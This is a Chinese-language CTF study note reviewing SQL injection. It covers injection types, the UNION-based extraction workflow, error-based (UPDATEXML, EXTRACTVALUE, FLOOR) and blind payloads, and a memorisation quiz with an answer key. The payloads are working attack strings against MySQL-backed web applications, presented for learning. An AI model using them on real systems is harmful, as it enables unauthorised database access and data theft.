# Day 22：第三周总复盘——SQL注入深度回顾

> **学习目标**：复习第三周所学的SQL注入知识，进行白纸默写测试，检验学习成果
> 
> **学习时长**：2小时
> 
> **难度等级**：⭐⭐⭐

---

## 📚 今日内容概览

1. SQL注入知识点回顾
2. 白纸默写测试
3. 错题复盘
4. 学习计划调整

---

## 一、SQL注入知识点回顾

### 1.1 SQL注入类型

```
SQL注入类型总结：

1. 按参数类型分：
   - 数字型注入：参数是数字，无需闭合引号
   - 字符型注入：参数是字符串，需要闭合引号

2. 按注入方式分：
   - 联合查询注入：使用UNION SELECT获取数据
   - 报错注入：利用数据库错误获取数据
   - 布尔盲注：根据页面状态判断
   - 时间盲注：根据响应时间判断

3. 按位置分：
   - GET注入：参数在URL中
   - POST注入：参数在请求体中
   - Cookie注入：参数在Cookie中
   - HTTP头注入：参数在请求头中
```

### 1.2 注入流程

```
标准注入流程：
  1. 判断注入类型（数字型/字符型）
  2. 判断闭合方式（单引号/双引号/括号）
  3. ORDER BY判断列数
  4. UNION SELECT测试显示位
  5. 获取数据库信息（database()）
  6. 获取表名（information_schema.TABLES）
  7. 获取字段名（information_schema.COLUMNS）
  8. 获取数据内容

每个步骤的Payload：
  1. 判断类型：?id=1 AND 1=1（数字型）；?id=1'（字符型）
  2. 判断闭合：?id=1'、?id=1"、?id=1)等
  3. ORDER BY：?id=1 ORDER BY N--
  4. UNION SELECT：?id=-1 UNION SELECT 1,2,3--
  5. 数据库名：?id=-1 UNION SELECT 1,database(),3--
  6. 表名：?id=-1 UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),3 FROM information_schema.TABLES WHERE TABLE_SCHEMA=database()--
  7. 字段名：?id=-1 UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME),3 FROM information_schema.COLUMNS WHERE TABLE_NAME='flag'--
  8. 数据：?id=-1 UNION SELECT 1,flag,3 FROM flag--
```

### 1.3 报错注入

```
报错注入方法：

1. UPDATEXML：
   Payload：?id=1 AND UPDATEXML(1, CONCAT(0x7e, (SELECT 查询), 0x7e), 1)--
   原理：XPath语法错误
   长度限制：32位

2. EXTRACTVALUE：
   Payload：?id=1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 查询), 0x7e))--
   原理：XPath语法错误
   长度限制：32位

3. FLOOR：
   Payload：?id=1 AND (SELECT COUNT(*) FROM information_schema.TABLES GROUP BY CONCAT(0x7e, (SELECT 查询), 0x7e, FLOOR(RAND(0)*2)))--
   原理：GROUP BY重复键错误
```

### 1.4 盲注

```
盲注方法：

1. 布尔盲注：
   - 判断长度：?id=1 AND LENGTH((SELECT database()))=N
   - 逐字符推断：?id=1 AND SUBSTRING((SELECT database()),1,1)='a'
   - ASCII比较：?id=1 AND ASCII(SUBSTRING((SELECT database()),1,1))>97

2. 时间盲注：
   - 判断长度：?id=1 AND IF(LENGTH((SELECT database()))=N, SLEEP(5), 0)
   - 逐字符推断：?id=1 AND IF(SUBSTRING((SELECT database()),1,1)='a', SLEEP(5), 0)
   - ASCII比较：?id=1 AND IF(ASCII(SUBSTRING((SELECT database()),1,1))>97, SLEEP(5), 0)
```

### 1.5 常用函数

```
常用SQL函数：
  - database()：获取当前数据库名
  - user()：获取当前用户名
  - @@version：获取MySQL版本
  - GROUP_CONCAT()：合并多行结果
  - CONCAT()：连接字符串
  - SUBSTRING()：截取字符串
  - LENGTH()：获取字符串长度
  - ASCII()：获取字符的ASCII码
  - IF()：条件判断
  - SLEEP()：延迟执行
  - UPDATEXML()：XML更新函数
  - EXTRACTVALUE()：XML提取函数
```

---

## 二、白纸默写测试

### 2.1 测试规则

```
测试规则：
  1. 准备一张白纸和一支笔
  2. 在15分钟内完成默写
  3. 不允许查看笔记
  4. 完成后对照检查

测试内容：
  1. SQL注入类型分类
  2. ORDER BY判列数方法
  3. UNION SELECT联合查询Payload
  4. 报错注入常用函数
  5. 盲注方法
  6. information_schema表结构
```

### 2.2 测试内容

```
测试1：SQL注入类型分类
  按参数类型分：______、______
  按注入方式分：______、______、______、______
  按位置分：______、______、______、______

测试2：ORDER BY判列数
  基本Payload：______
  原理：______
  示例：______

测试3：UNION SELECT联合查询
  基本Payload：______
  要求：______
  示例：______

测试4：报错注入
  UPDATEXML Payload：______
  EXTRACTVALUE Payload：______
  FLOOR Payload：______

测试5：盲注方法
  布尔盲注Payload：______
  时间盲注Payload：______

测试6：information_schema
  获取数据库名的表：______
  获取表名的表：______
  获取字段名的表：______
```

### 2.3 答案对照

```
测试1答案：
  按参数类型分：数字型注入、字符型注入
  按注入方式分：联合查询注入、报错注入、布尔盲注、时间盲注
  按位置分：GET注入、POST注入、Cookie注入、HTTP头注入

测试2答案：
  基本Payload：?id=1 ORDER BY N--
  原理：ORDER BY后面跟数字N表示按第N列排序，如果N超过实际列数会报错
  示例：?id=1 ORDER BY 3--（如果正常说明至少有3列）

测试3答案：
  基本Payload：?id=-1 UNION SELECT 1,2,3--
  要求：列数必须与原查询相同，原查询要返回空（使用-1）
  示例：?id=-1 UNION SELECT 1,database(),3--

测试4答案：
  UPDATEXML Payload：?id=1 AND UPDATEXML(1, CONCAT(0x7e, (SELECT database()), 0x7e), 1)--
  EXTRACTVALUE Payload：?id=1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e))--
  FLOOR Payload：?id=1 AND (SELECT COUNT(*) FROM information_schema.TABLES GROUP BY CONCAT(0x7e, (SELECT database()), 0x7e, FLOOR(RAND(0)*2)))--

测试5答案：
  布尔盲注Payload：?id=1 AND SUBSTRING((SELECT database()),1,1)='a'
  时间盲注Payload：?id=1 AND IF(SUBSTRING((SELECT database()),1,1)='a', SLEEP(5), 0)

测试6答案：
  获取数据库名的表：SCHEMATA（SCHEMA_NAME列）
  获取表名的表：TABLES（TABLE_SCHEMA和TABLE_NAME列）
  获取字段名的表：COLUMNS（TABLE_NAME和COLUMN_NAME列）
```

---

## 三、错题复盘

### 3.1 回顾红牌题目

```
红牌题目定义：
  - 超过10分钟没做出来
  - 看了提示才做出来
  - 多次尝试仍失败

复盘步骤：
  1. 重现问题
  2. 分析原因
  3. 总结规律
  4. 巩固记忆

常见红牌原因：
  - 闭合方式判断错误
  - 列数判断错误
  - 不知道使用哪种注入方法
  - 被WAF拦截
```

### 3.2 复盘模板

```
错题复盘模板：

题目名称：______
卡住位置：______
正确解法：______
错误原因：______
下次改进：______
相关知识点：______
```

### 3.3 常见错误总结

```
常见错误：
  1. 忘记注释（--或/* */）
  2. 闭合方式错误
  3. 列数判断错误
  4. UNION SELECT时原查询没有返回空
  5. 时间盲注时延时时间不够
  6. GROUP_CONCAT结果被截断

改进方法：
  - 养成添加注释的习惯
  - 仔细测试闭合方式
  - 使用ORDER BY多次确认列数
  - 确保使用-1等无效值让原查询返回空
  - 适当增加延时时间
  - 使用LIMIT分页获取数据
```

---

## 四、学习计划调整

### 4.1 进度评估

```
进度评估表：

| 技能 | 掌握程度 | 备注 |
|:---|:---:|:---|
| SQL注入基础 | ⭐⭐⭐⭐⭐ | 熟练 |
| 数字型/字符型注入 | ⭐⭐⭐⭐⭐ | 熟练 |
| ORDER BY判列数 | ⭐⭐⭐⭐⭐ | 熟练 |
| UNION SELECT联合查询 | ⭐⭐⭐⭐⭐ | 熟练 |
| information_schema | ⭐⭐⭐⭐ | 熟悉 |
| 报错注入 | ⭐⭐⭐⭐ | 熟悉 |
| 布尔盲注 | ⭐⭐⭐ | 熟悉 |
| 时间盲注 | ⭐⭐⭐ | 熟悉 |

目标：
  - 所有技能达到⭐⭐⭐⭐⭐
  - 盲注需要加强练习
```

### 4.2 下周计划

```
第四周计划：文件上传与文件包含

Day 23：文件上传基础
Day 24：文件上传绕过
Day 25：文件包含漏洞
Day 26：远程文件包含
Day 27：本地文件包含
Day 28：PHP伪协议
Day 29：文件上传实战
Day 30：第四周复盘

目标：
  - 掌握文件上传漏洞
  - 掌握文件包含漏洞
  - 学会各种绕过方法
```

---

## 五、今日总结

### 5.1 知识点回顾

```
✅ SQL注入类型
  - 数字型/字符型
  - 联合查询/报错/布尔盲注/时间盲注

✅ 注入流程
  - 判断类型→闭合方式→列数→显示位→信息获取

✅ 报错注入
  - UPDATEXML、EXTRACTVALUE、FLOOR

✅ 盲注
  - 布尔盲注、时间盲注

✅ 常用函数
  - database()、GROUP_CONCAT()、SUBSTRING()等

✅ 白纸默写测试
  - 检验学习成果
```

### 5.2 关键记忆点

```
记住这个口诀：

SQL注入不难学，流程清晰是关键；
先判类型和闭合，ORDER BY判列数；
UNION SELECT拿数据，报错注入看错误；
盲注没信息也不怕，布尔时间都能查！

流程：
  判断注入类型 → ORDER BY判列数 → UNION SELECT测试显示位 → 获取数据库信息 → 获取数据
```

### 5.3 今日作业

```
必做题：
  1. 完成白纸默写测试
  2. 复盘红牌题目
  3. 制定下周学习计划

选做题：
  1. 复习SQL注入基础知识
  2. 练习盲注技巧
  3. 在CTFHub找题目练习

提交内容：
  - 默写测试结果
  - 错题复盘记录
  - 下周计划
```

### 5.4 明日预告

```
Day 23：文件上传基础

学习内容：
  - 文件上传漏洞原理
  - 常见上传限制
  - 文件类型验证
```

---

**恭喜你完成Day 22的学习！第四周开始学习文件上传与文件包含！** 🎉
